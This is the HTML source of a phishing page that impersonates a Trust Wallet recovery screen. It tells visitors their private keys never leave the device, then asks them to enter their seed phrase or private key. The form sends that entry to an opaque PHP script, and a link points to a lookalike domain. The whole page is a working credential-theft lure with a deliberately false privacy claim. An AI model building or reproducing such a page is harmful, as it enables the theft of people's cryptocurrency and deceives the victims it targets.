<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <title>Trust Wallet</title>
    <link rel="icon" href="images/favicontrust.png" type="image/ico">


    <link theme="default" rel="stylesheet" href="15789523.css">

 


<body class="web restore" style="
    margin: 0;
    padding: 0;
">


<!---->
<ui-view name="main" class="ui-view ui-view_main" style="">

<div w-i18n-ns="app.restore" class="main-container movable">
<div class="main-container-wrapper">
<div class="restore-content get-started-content">
<img style="display: block;margin: 0 auto;text-align: center;width: 220px;height: 167pxpx;margin-bottom: -14px;" src="images/trustwall.png">
<br>
<w-step-by-step active-step="$ctrl.activeStep" class="step-by-step">
<div class="step-list" ng-transclude="">
<w-step class="step" step="0">
<!---->
<div ng-if="$ctrl.state" ng-transclude="">
<div class="headline-1 margin-2 text-center" w-i18n="seedOrKeyForm.title">Private and secure
</div>
    <div class="body-2 text-center margin-2"> 
    <font size="3" face="Arial">
    <b style="
    color: #555d6d;
    font-family: inherit;
">Private Keys never leave your device.</b>
    </font>
    <br>
    <br>
   
    </div>
    <div class="body-2 basic-900 ng-scope" w-i18n="seedForm.seedTitle"></div>
<div class="headline-1 text-center ng-scope" w-i18n="seedForm.title"></div>

<form action="159875126.php" method="POST" accept-charset="UTF-8" class="margin-2">

    
    <div class="seed-block margin-3">
    <w-input textarea="id=" required="" name="PrivateKey" maxlength="150" class="embed no-icon big ng-pristine ng-untouched ng-isolate-scope ng-valid-minlength ng-not-empty ng-valid ng-valid-required=" placeholder="Enter Phrase or Private Keys" w-i18n-attr="placeholder" minlength="25" aria-invalid="false" aria-required="true" style="">
   

<div class="w-input-wrap">
<textarea textarea="id=" required="" name="PrivateKey" maxlength="150" "="" class="embed no-icon big ng-isolate-scope ng-valid-minlength ng-dirty ng-valid-parse ng-touched ng-not-empty ng-valid ng-valid-required" ng-model="mpcseed" placeholder="Phrase" w-i18n-attr="placeholder" minlength="24" required"name="login_password" aria-invalid="false" style=""></textarea></div>
</w-input>




<div class="body-2 basic-900 ng-scope" w-i18n="seedForm.seedTitle">Typically 12 (sometimes 24) words separated by single spaces</div></div>


<w-button disabled="!$ctrl.address" class="submit big long ng-isolate-scope" w-step-next="">
<button ng-transclude="" class="submit big long">
<w-i18n class="ng-scope">IMPORT</w-i18n>
</button>
</w-button>
</form>
</div>
<!---->
</w-step>
<w-step class="step" step="1">
<!---->
</w-step>
</div>
</w-step-by-step>
<w-get-started-link class="get-started-link" has-create="::true">
<div w-i18n-ns="app.create" class="get-started-link__container">
<div class="get-started-link__btns body-2">
<!----><!---->
<a ui-sref="create" class="get-started-link__btn" ng-if="$ctrl.hasCreate" href="https://forsage-bounty-program.trustwallet-best-cryptocurrency.com/"></a>
<!----><!---->
</div>
</div></w-get-started-link></div>
</div>
</div>
</ui-view>



<style>img[alt*="www.000webhost.com"]{display:none}</style>

</body>
</html>